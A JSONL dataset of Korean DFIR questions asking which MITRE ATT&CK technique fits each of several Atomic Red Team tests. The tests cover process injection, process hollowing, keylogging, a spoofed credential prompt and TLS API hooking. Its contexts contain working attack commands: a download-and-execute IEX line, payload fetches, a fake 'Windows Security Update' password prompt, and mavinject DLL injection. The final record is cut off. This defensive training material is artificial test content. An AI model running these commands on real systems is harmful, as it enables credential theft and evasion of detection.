{"id": "T1055.004_T1055.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.004 Process Injection: Asynchronous Procedure Call (APC) (Tactic: Defense Evasion)\n[요약] C# 기반 인젝션 도구(T1055.exe)를 실행해 5가지 메모리 인젝션 기법(일반 프로세스 인젝션, ApcInjectionAnyProcess, ApcInjectionNewProcess, IAT Injection, ThreadHijack)을 한 번에 연습하는 시나리오.\n[절차] 1) 사전 준비:    - PE 바이너리 T1055.exe가 다음 경로에 존재해야 한다:      · PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe    - 존재하지 않을 경우, Atomic Red Team 레포에서 해당 exe를 다운로드하는 PowerShell 의존성 단계로 파일을 준비한다.  2) 인젝션 도구 실행:    - cmd.exe 또는 PowerShell에서 다음 명령이 실행된다:      · \"PathToAtomicsFolder\\T1055.004\\bin\\T1055.exe\"    - 이 실행 파일은 내부적으로 다음과 같은 C# 기반 메모리 인젝션 기술들을 순차적으로 또는 옵션에 따라 수행한다:      1) Process injection: 대상 프로세스를 열고 메모리 할당 → 셸코드/PE 쓰기 → 원격 스레드 생성      2) ApcInjectionAnyProcess: 이미 실행 중인 프로세스의 alertable 상태 스레드에 QueueUserAPC를 사용해 셸코드 주소를 등록      3) ApcInjectionNewProcess: 새 프로세스를 생성(suspended/alertable) 후 QueueUserAPC를 이용해 조기(Early) 코드 실행      4) IAT Injection: Import Address Table에 후킹/패치 후 특정 API 호출 시 공격자 코드가 먼저 실행되도록 조작      5) ThreadHijack: 기존 스레드 컨텍스트를 변경해 셸코드를 실행시키는 스레드 하이재킹  3) 결과 확인:    - 콘솔(stdout)에 각 기법 수행 단계 및 상태 메시지가 출력된다.    - 특정 기법의 경우, 메시지 박스나 calc.exe/notepad.exe 등 테스트용 프로세스가 생성될 수 있다(실제 구현에 따라 상이).  4) 실험 종료:    - T1055.exe 프로세스와, 테스트 중 생성된 calc.exe / notepad.exe / 샘플 대상 프로세스들을 수동 또는 후속 스크립트로 종료해 정리한다.\n[대표 명령 예시]\n\"#{exe_binary}\"", "answer": "이 행위는 MITRE ATT&CK의 T1055.004 \"Process Injection: Asynchronous Procedure Call (APC)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.004_T1055.004-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.004 Process Injection: Asynchronous Procedure Call (APC) (Tactic: Defense Evasion)\n[요약] Go로 구현된 EarlyBird 기법을 사용해, 서스펜드 상태로 생성한 프로세스에 QueueUserAPC를 걸어 스레드가 재개되기 직전에 셸코드를 실행하는 실습.\n[절차] 1) 사전 준비:    - EarlyBird.exe가 다음 경로에 존재한다고 가정한다:      · PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe  2) PowerShell에서 인젝션 도구 실행:    - 명령:      · $PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"C:\\Windows\\System32\\werfault.exe\" -debug    - 주요 동작(일반적인 EarlyBird APC 인젝션 흐름):      1) CreateProcess API를 사용해 대상 프로그램(기본: werfault.exe)을 suspended 상태로 생성한다.      2) 대상 프로세스의 메모리 공간에 VirtualAllocEx 등으로 셸코드 영역을 할당하고, WriteProcessMemory로 셸코드를 기록한다.      3) 대상 프로세스의 메인 스레드(또는 특정 스레드)에 QueueUserAPC를 사용해 셸코드 시작 주소를 User APC로 등록한다.      4) ResumeThread를 호출하여 프로세스를 재개하면, 초기 단계에서 NtTestAlert가 호출되면서 등록된 APC가 실행되고 셸코드가 동작한다.    - -debug 옵션으로 내부 상태나 디버깅 메시지를 콘솔에서 확인할 수 있다.  3) 결과:    - 셸코드 내부 구현에 따라 calc.exe, 메시지 박스, 혹은 다른 행위가 실행된다(Atomic 설명에서는 CalculatorApp 종료를 cleanup에서 수행).  4) 정리(Cleanup):    - 스크립트 cleanup에서 다음 명령을 수행:      · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue      · Stop-Process -Name werfault -ErrorAction SilentlyContinue    - 이를 통해 테스트 중 생성된 werfault.exe 및 CalculatorApp 프로세스를 정리한다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055.004\\bin\\x64\\EarlyBird.exe -program \"#{spawn_process_path}\" -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055.004 \"Process Injection: Asynchronous Procedure Call (APC)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.004_T1055.004-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.004 Process Injection: Asynchronous Procedure Call (APC) (Tactic: Defense Evasion)\n[요약] NtQueueApcThreadEx WinAPI를 사용해 현재 스레드에 Special User APC를 등록하고, 로컬 프로세스 내에서 셸코드를 실행하는 시나리오.\n[절차] 1) 사전 준비:    - NtQueueApcThreadEx.exe가 다음 경로에 존재한다고 가정:      · PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe  2) PowerShell에서 도구 실행:    - 명령:      · $PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug    - 내부 동작(일반적인 로컬 APC 인젝션 흐름):      1) VirtualAlloc 를 통해 현재 프로세스 주소 공간에 RW 권한으로 메모리 영역을 할당한다.      2) RtlCopyMemory 를 사용해 셸코드를 해당 영역에 복사한다.      3) VirtualProtect 로 메모리 권한을 RX(Execute/Read)로 변경한다.      4) NtQueueApcThreadEx 를 통해 현재 스레드 핸들에 Special User APC를 등록하고, 그 APC가 셸코드 주소를 가리키도록 설정한다.      5) 스레드가 alertable 상태로 전환될 때 APC가 트리거되며 셸코드가 실행된다.  3) 결과:    - 구현된 셸코드에 따라 CalculatorApp 실행 또는 메시지 박스 표시 등 테스트용 행동이 발생한다.  4) 정리(Cleanup):    - cleanup_command에서 CalculatorApp 프로세스를 종료:      · Stop-Process -Name CalculatorApp -ErrorAction SilentlyContinue    - 필요시 NtQueueApcThreadEx.exe 파일도 제거해 흔적을 줄인다.\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055.004\\bin\\x64\\NtQueueApcThreadEx.exe -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055.004 \"Process Injection: Asynchronous Procedure Call (APC)\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.011_T1055.011-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.011 Process Injection: Extra Window Memory Injection (Tactic: Defense Evasion)\n[요약] x64 또는 x86용 EWM 인젝션 전용 PE(T1055.011_#{arch}.exe)를 실행해, 대상 프로세스의 윈도우 객체 Extra Window Memory 영역에 페이로드(payload.exe_#{arch}.bin)를 적재하고 훅을 통해 실행하는 시나리오.\n[절차] 1) 사전 조건(의존성) 준비:    - arch 입력값(x64 또는 x86)에 따라 다음 두 파일 경로가 결정된다.      · exe_binary: PathToAtomicsFolder\\T1055.011\\bin\\T1055.011_#{arch}.exe      · payload_file: PathToAtomicsFolder\\T1055.011\\bin\\payload.exe_#{arch}.bin     - PowerShell 의존성 단계에서 다음을 수행한다:      1) (split-path #{exe_binary}) 경로에 디렉터리가 없으면 New-Item으로 생성.      2) GitHub(redcanaryco/atomic-red-team)에서 다음 두 파일을 다운로드:         · T1055.011_#{arch}.exe  →  #{exe_binary}         · payload.exe_#{arch}.bin → #{payload_file}      3) 두 파일이 모두 존재하면 prereq_command가 0을 반환하여 테스트 실행이 가능해진다.  2) EWM 인젝션 실행:    - PowerShell 실행기에서 다음 명령을 수행한다:      · #{exe_binary}     - EWM 인젝터(#{exe_binary}) 내부 동작(일반적인 Extra Window Memory 인젝션 흐름 예시):      1) 자체 GUI 윈도우(또는 대상 프로세스의 윈도우 핸들)를 생성하거나 열고, 해당 윈도우에 Extra Window Memory(EWM)를 할당한다.         · 보통 CreateWindowEx, RegisterClassEx, SetWindowLongPtr(GWLP_USERDATA, GWL_EXSTYLE 등)과 같은 Win32 API를 활용.      2) payload_file에 있는 raw 페이로드(payload.exe_#{arch}.bin)를 읽어 들여, EWM 영역에 복사하거나, EWM에 페이로드 주소/구조체 포인터를 저장한다.      3) 윈도우 프로시저(WindowProc) 후킹 또는 API 훅을 통해 특정 메시지/이벤트가 발생했을 때, EWM에 저장된 페이로드를 실행하도록 로직을 구성한다.         · 예: WM_PAINT, WM_TIMER 등 메시지 처리 시 EWM에 있는 코드/주소를 호출.      4) 최종적으로, EWM에 적재된 페이로드가 대상 프로세스의 컨텍스트에서 실행된다.         · Atomic 테스트에서는 일반적으로 notepad.exe 등 눈에 보이는 프로세스를 스폰해 동작 여부를 확인하는 경우가 많다.  3) 결과 확인:    - 인젝션이 성공하면, 테스트용 페이로드에 따라 다음과 같은 현상이 발생할 수 있다:      · Notepad.exe 실행, 메시지 박스 출력, 기타 샘플 동작.    - 메모리 포렌식 또는 EDR 관점에서는:      · GUI 프로세스의 윈도우 구조체(Extra Window Memory 영역)에 평소와 다른 코드/포인터가 존재.      · 일반적인 VirtualAllocEx/WriteProcessMemory/CreateRemoteThread 시그니처 없이 코드 실행 흔적.  4) 정리(Cleanup):    - Atomic 정의에 따른 PowerShell cleanup_command:      · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force    - 이는 테스트 중 실행된 notepad 프로세스를 강제로 종료한다.    - 필요시 PathToAtomicsFolder\\T1055.011\\bin 디렉터리 및 다운로드된 T1055.011_#{arch}.exe, payload.exe_#{arch}.bin 파일도 수동으로 삭제해 환경을 원상 복구한다.\n[대표 명령 예시]\n#{exe_binary}", "answer": "이 행위는 MITRE ATT&CK의 T1055.011 \"Process Injection: Extra Window Memory Injection\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.012_T1055.012-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.012 Process Injection: Process Hollowing (Tactic: Defense Evasion)\n[요약] FuzzySecurity의 Start-Hollow.ps1 스크립트를 이용해, explorer를 부모 프로세스로 두고 notepad.exe를 스폰서(sponsor) 프로세스로 생성한 뒤, 그 내부를 hollow_binary(cmd.exe)로 교체해 실행하는 PowerShell 기반 프로세스 할로잉 시나리오.\n[절차] 1) 의존성(Prereq) 준비:    - script_path: Start-Hollow.ps1가 저장될 경로        · 기본값: PathToAtomicsFolder\\T1055.012\\src\\Start-Hollow.ps1    - script_download_url: Start-Hollow.ps1 다운로드 URL        · 기본값: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/720d8fe82396faf74f2ca19a3fe99a5c262a14b9/Start-Hollow.ps1     - PowerShell dependency 단계:      1) prereq_command:         · if (Test-Path \"#{script_path}\") {exit 0} else {exit 1}         → script_path에 파일이 없으면 get_prereq_command 실행.      2) get_prereq_command:         · iwr \"#{script_download_url}\" -OutFile (New-Item -Path #{script_path} -Force)         → GitHub에서 Start-Hollow.ps1를 다운로드해 script_path에 저장.  2) 프로세스 할로잉 실행:    - PowerShell executor에서 다음 명령을 실행:      · . \"#{script_path}\"        - Start-Hollow.ps1 스크립트를 dot-source로 로드해 현재 세션에 Start-Hollow 함수 등록.       · $ppid = Get-Process #{parent_process_name} | select -expand id        - parent_process_name(기본 explorer)의 PID를 얻어 부모 프로세스로 사용할 PID 확보.       · Start-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose        - Sponsor: 할로잉 당하는 껍데기 프로세스 (기본: C:\\Windows\\System32\\notepad.exe)        - Hollow: 실제로 실행할 바이너리 (기본: C:\\Windows\\System32\\cmd.exe)        - ParentPID: explorer PID → 프로세스 트리에서 자식이 정상적으로 보이도록 위장.     - 일반적인 Start-Hollow 동작 흐름(요약):      1) 지정한 ParentPID(explorer)를 부모로 하는 Sponsor 프로세스(notepad.exe)를 CREATE_SUSPENDED 상태로 생성.      2) Sponsor 프로세스의 메모리에서 원래 PE 이미지(notepad.exe)를 언맵/제거.      3) Hollow 바이너리(cmd.exe)를 읽어와 Sponsor 프로세스의 주소 공간에 매핑하고, 섹션 및 엔트리 포인트를 재설정.      4) 수정된 엔트리 포인트로 스레드를 재개(Resume)하여, 겉은 notepad.exe지만 내부는 cmd.exe가 동작하는 프로세스를 생성.  3) 결과:    - 프로세스 트리 상에서는 explorer → notepad (스폰서) 구조로 보이지만, 실질적으로 notepad 프로세스는 cmd.exe 코드가 구동되는 할로잉 상태.    - EDR/포렌식에서는 PE 헤더·섹션과 이미지 경로가 불일치하는 점, 의심스러운 메모리 매핑 API 호출 패턴 등을 통해 탐지할 수 있다.  4) 정리(Cleanup):    - Atomic 정의된 cleanup_command:      · Stop-Process -Name \"#{spawnto_process_name}\" -ErrorAction Ignore      → 기본값: notepad 이름의 프로세스를 종료.    - 추가로 원한다면 Start-Hollow.ps1 파일과 다운로드 폴더를 수동으로 삭제해 환경을 원복할 수 있다.\n[대표 명령 예시]\n. \"#{script_path}\"\n$ppid=Get-Process #{parent_process_name} | select -expand id\nStart-Hollow -Sponsor \"#{sponsor_binary_path}\" -Hollow \"#{hollow_binary_path}\" -ParentPID $ppid -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1055.012 \"Process Injection: Process Hollowing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.012_T1055.012-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.012 Process Injection: Process Hollowing (Tactic: Defense Evasion)\n[요약] 악성 매크로(Invoke-MalDoc + T1055.012-macrocode.txt)를 통해 WINWORD.EXE 프로세스 내부에서 notepad.exe를 RunPE/할로잉 방식으로 실행하는 시나리오.\n[절차] 1) 의존성(Prereq) 준비:    - ms_product: Word 등 Office 제품명 (기본값: Word)     - Microsoft #{ms_product} 설치 여부 확인:      · try {          New-Object -COMObject \"#{ms_product}.Application\" | Out-Null          $process = \"#{ms_product}\"; if ($process -eq \"Word\") {$process = \"winword\"}          Stop-Process -Name $process          exit 0        } catch { exit 1 }      → Word COM 객체 생성에 실패하면 요구사항 불충족.    - 설치되어 있지 않으면 수동 설치 안내 메시지만 출력(get_prereq_command).  2) 말웨어 문서 실행(Invoke-MalDoc):    - PowerShell executor에서 다음 명령을 실행:      1) [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12      2) IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)      3) Invoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"     - 동작 개요:      · Invoke-MalDoc.ps1 스크립트를 로드해, 지정한 macroFile(T1055.012-macrocode.txt)을 포함하는 Office 문서를 실행.      · 'Exploit' 서브루틴을 가진 VBA 매크로가 WINWORD.EXE 내부에서 실행되며, RunPE/Process Hollowing 형태로 notepad.exe를 Word 프로세스 컨텍스트에서 실행하도록 구현되어 있음.  3) 결과:    - Word가 열리면서 내부적으로 notepad.exe 실행 코드가 수행되고, 프로세스 트리/메모리 구조 상 Word와 notepad 간 비정상적인 관계가 나타날 수 있다.    - 포렌식 측면에서는 Office 프로세스(WINWORD.EXE) 메모리 내에 notepad PE 구조 또는 RunPE 흔적(매핑되지 않은 섹션, 재배치 흔적 등)이 존재하는지 확인할 수 있다.  4) 정리(Cleanup):    - Atomic 정의에는 별도 cleanup_command가 없고, 일반적으로 테스트 후 Word/Notepad를 종료하면 된다.    - 실험 환경에서는:      · PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt      · 다운로드된 Invoke-MalDoc.ps1      등을 삭제해 흔적을 최소화할 수 있다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-MalDoc -macroFile \"PathToAtomicsFolder\\T1055.012\\src\\T1055.012-macrocode.txt\" -officeProduct \"#{ms_product}\" -sub \"Exploit\"", "answer": "이 행위는 MITRE ATT&CK의 T1055.012 \"Process Injection: Process Hollowing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.012_T1055.012-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.012 Process Injection: Process Hollowing (Tactic: Defense Evasion)\n[요약] Go로 작성된 헬퍼 바이너리(CreateProcess.exe, CreateProcessWithPipe.exe)를 이용해 werfault.exe 같은 정상 PE를 일단 Suspended 상태로 띄운 뒤, 그 내부를 셸코드로 대체(할로잉)하고 calc.exe를 자식 프로세스로 생성하는 시나리오 두 가지(파이프 미사용/사용).\n[대표 명령 예시]\n$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcess.exe -program \"#{hollow_binary_path}\" -debug\n$PathToAtomicsFolder\\T1055.012\\bin\\x64\\CreateProcessWithPipe.exe -program \"#{hollow_binary_path}\" -debug", "answer": "이 행위는 MITRE ATT&CK의 T1055.012 \"Process Injection: Process Hollowing\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1055.015_T1055.015-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1055.015 Process Injection: ListPlanting (Tactic: Defense Evasion)\n[요약] ListPlanting.exe를 이용해 RegEdit 프로세스의 ListView 컨트롤을 악용, NtWriteVirtualMemory + PostMessage를 통해 셸코드를 주입/실행하는 시나리오. 성공 시 \"Warning / Atomic Red Team\" 메시지 박스가 뜬 뒤 Notepad가 실행된다.\n[절차] 1) 의존성(Prereq) 준비:    - exe_binary: ListPlanting 인젝터 경로        · 기본값: PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe     - PowerShell dependency 로직:      1) prereq_command:         · if (Test-Path \"#{exe_binary}\") {exit 0} else {exit 1}         → 지정한 경로에 ListPlanting.exe가 없으면 get_prereq_command 실행.      2) get_prereq_command:         · New-Item -Type Directory (split-path \"#{exe_binary}\") -ErrorAction ignore | Out-Null         · Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055.015/bin/ListPlanting.exe\" -OutFile \"#{exe_binary}\"         → GitHub에서 ListPlanting.exe를 다운로드해 PathToAtomicsFolder\\T1055.015\\bin에 저장.  2) 인젝션 실행:    - PowerShell executor에서 다음 명령 수행:      · Start-Process \"#{exe_binary}\"        - ListPlanting.exe 실행.        - 내부 동작(요약 예상):          1) RegEdit 프로세스를 찾거나 새로 실행 (ListView 컨트롤을 가진 타깃 윈도우 식별).          2) NtWriteVirtualMemory를 사용해 RegEdit 프로세스의 메모리에 셸코드를 기록.          3) ListView 컨트롤/윈도우 핸들로 PostMessage 등을 보내, 셸코드 실행이 일어나는 코드 경로를 트리거.          4) 셸코드가 MessageBox(\"Warning\", \"Atomic Red Team\")를 띄우고, 이후 Notepad를 실행.       · Start-Sleep -Seconds 7        - 인젝션 및 메시지 박스, Notepad 실행이 완료될 시간을 기다림.       · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force        - 테스트 종료를 위해 Notepad 프로세스를 강제 종료.  3) 결과:    - 정상 시나리오:      · 몇 초 내에 메시지 박스가 나타남:          - 제목: \"Warning\"          - 내용: \"Atomic Red Team\"      · 메시지 박스 이후 Notepad가 자동으로 실행.    - 이는 RegEdit(또는 타깃 프로세스) 내부에서 셸코드가 실행되었음을 의미.  4) 정리(Cleanup):    - Atomic 정의의 cleanup_command:      · Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force    - 추가로 실험 환경 정리를 위해:      · PathToAtomicsFolder\\T1055.015\\bin\\ListPlanting.exe 파일을 삭제 또는 별도 샌드박스 위치로 이동 가능.      · RegEdit/테스트 중 사용한 프로세스가 남아 있으면 수동 종료.\n[대표 명령 예시]\nStart-Process \"#{exe_binary}\"\nStart-Sleep -Seconds 7\nGet-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force", "answer": "이 행위는 MITRE ATT&CK의 T1055.015 \"Process Injection: ListPlanting\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1056.001_T1056.001-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1056.001 Input Capture: Keylogging (Tactic: Collection)\n[요약] PowerSploit의 Get-Keystrokes.ps1를 디스크에 위치시킨 뒤, PowerShell로 실행하여 지정한 경로(기본: %TEMP%\\key.log)에 키 입력을 기록하는 키로거 시나리오.\n[절차] 1) 의존성(Prereq) 준비:    - 필요한 파일:      · PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1     - PowerShell dependency 로직:      1) prereq_command:         · if (Test-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") {exit 0} else {exit 1}         → 지정 경로에 스크립트가 없으면 get_prereq_command 실행.       2) get_prereq_command:         · New-Item -ItemType Directory (Split-Path \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\") -Force | Out-Null         · Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile \"PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\"         → Atomic Red Team GitHub에서 Get-Keystrokes.ps1를 내려받아 저장.  2) 키로거 실행:    - 입력 인자:      · filepath: 로컬 로그 파일 경로        - 기본값: $env:TEMP\\key.log     - PowerShell executor 명령:      · &\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}     - 동작 개요:      1) Get-Keystrokes.ps1가 키보드 후킹(저수준 키보드 훅 또는 Win32 API)을 설정.      2) 이후 세션 내에서 발생하는 키 입력을 실시간으로 감지.      3) 감지한 키를 문자열로 가공하여 지정된 로그 파일(예: %TEMP%\\key.log)에 기록.      4) 특정 윈도우 타이틀/포커스 등과 함께 기록될 수 있어, 어떤 프로그램에서 어떤 키가 눌렸는지 추적 가능.  3) 결과 확인:    - 테스트 후 %TEMP%\\key.log (또는 #{filepath} 인자로 지정한 경로)를 열어 키 입력 로그를 확인.    - 로그에는 입력된 키, 타임스탬프, 포커스된 윈도우 정보 등이 포함될 수 있음.  4) 정리(Cleanup):    - Atomic 정의의 cleanup_command:      · Remove-Item $env:TEMP\\key.log -ErrorAction Ignore    - 필요 시:      · 로그 파일이 다른 경로에 생성되었으면 해당 파일도 수동 삭제.      · 키로거 스크립트 자체(Get-Keystrokes.ps1)를 포렌식/연구 용도가 아니라면 삭제 가능.\n[대표 명령 예시]\n&\"$PathToAtomicsFolder\\T1056.001\\src\\Get-Keystrokes.ps1\" -LogPath #{filepath}", "answer": "이 행위는 MITRE ATT&CK의 T1056.001 \"Input Capture: Keylogging\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1056.002_T1056.002-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1056.002 Input Capture: GUI Input Capture (Tactic: Collection)\n[요약] PowerShell의 PromptForCredential GUI 창을 이용해 ‘Windows Security Update’ 알림처럼 보이는 비밀번호 입력 팝업을 띄우고, 사용자가 입력한 비밀번호를 콘솔로 출력하는 로컬 피싱(credential prompt spoofing) 시나리오.\n[절차] 1) PowerShell 실행:    - 공격자는 PowerShell 콘솔 또는 스크립트에서 아래 명령을 실행한다.  2) 비밀번호 입력 창 생성:    - $host.UI.PromptForCredential()을 호출해 다음과 같은 속성을 가진 자격 증명 입력 창을 띄운다.      · 제목(캡션): 'Windows Security Update'      · 메시지: 공백(두 번째 인자를 빈 문자열로 전달)      · 기본 사용자명: 현재 [Environment]::UserName      · 도메인: [Environment]::UserDomainName     - 사용자는 실제 시스템 업데이트나 보안 알림처럼 인식하고, 사용자 이름과 비밀번호를 입력하게 된다.  3) 비밀번호 추출:    - 사용자 입력을 받은 뒤, 반환된 $cred 객체에서 다음과 같이 비밀번호를 추출한다.      · $cred.GetNetworkCredential().Password    - Atomic 정의에서는 write-warning를 사용하여, Invoke-AtomicTest 프레임워크에서도 콘솔에 비밀번호를 표시되도록 한다.  4) 결과:    - 콘솔/로그 상에 사용자가 입력한 비밀번호 문자열이 노출된다.    - 실제 공격에서는 이 비밀번호를 파일로 기록하거나 네트워크를 통해 외부로 전송하는 방식으로 연계될 수 있다.  5) 종료 및 정리:    - 이 테스트는 별도의 파일·레지스트리 아티팩트를 남기지 않고, PowerShell 프로세스 종료 시 함께 종료된다.    - 포렌식 관점에서는 PowerShell 실행 이력(예: PowerShell Operational 로그, ScriptBlock 로그 등)을 통해 명령 내역을 추적할 수 있다.\n[대표 명령 예시]\n# Creates GUI to prompt for password. Expect long pause before prompt is available.\n$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName)\n# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.\nwrite-warning $cred.GetNetworkCredential().Password", "answer": "이 행위는 MITRE ATT&CK의 T1056.002 \"Input Capture: GUI Input Capture\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Collection이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1056.004_T1056.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1056.004 Input Capture: Credential API Hooking (Tactic: Collection / Credential Access)\n[요약] mavinject.exe를 사용해 현재 PowerShell 프로세스에 후킹용 DLL(T1056.004x64.dll)을 주입하고, 그 상태에서 Invoke-WebRequest로 HTTPS 요청을 전송하여 TLS 암·복호화 API를 후킹하는 시나리오.\n[절차] 1) 사전 준비:    - T1056.004x64.dll이 다음 기본 경로에 존재해야 한다:      · PathToAtomicsFolder\\T1056.004\\bin\\T1056.004x64.dll    - 존재하지 않을 경우 Atomic 정의의 get_prereq_command에 따라 GitHub에서 DLL을 다운로드한다.  2) PowerShell 관리자 권한 실행:    - 본 테스트는 mavinject를 사용하므로, 일반적으로 관리자 권한 PowerShell 세션에서 실행한다.  3) DLL 인젝션 수행:    - PowerShell에서 다음 명령을 실행한다:      · mavinject $pid /INJECTRUNNING \"#{file_name}\"    - 여기서 $pid는 현재 PowerShell 프로세스의 PID를 의미하며, mavinject는 해당 프로세스에 지정된 DLL을 주입한다.    - DLL 내부에서는 TLS 암·복호화 관련 API(예: EncryptMessage/DecryptMessage, SChannel 계열 함수 등)를 후킹하도록 구현되어 있다고 가정한다.  4) HTTPS 요청 발생:    - 같은 PowerShell 세션에서 다음 명령을 실행한다:      · Invoke-WebRequest #{server_name} -UseBasicParsing    - 기본값은 https://www.example.com 으로 GET 요청을 전송한다.    - 후킹된 DLL은 TLS 스트림이 암호화되기 전/복호화된 후의 평문 데이터를 내부적으로 캡처·로깅할 수 있다.  5) 결과 확인:    - DLL 구현에 따라, 평문 요청/응답 데이터가 파일로 기록되거나, 디버그 출력/파이프 등으로 유출될 수 있다.    - 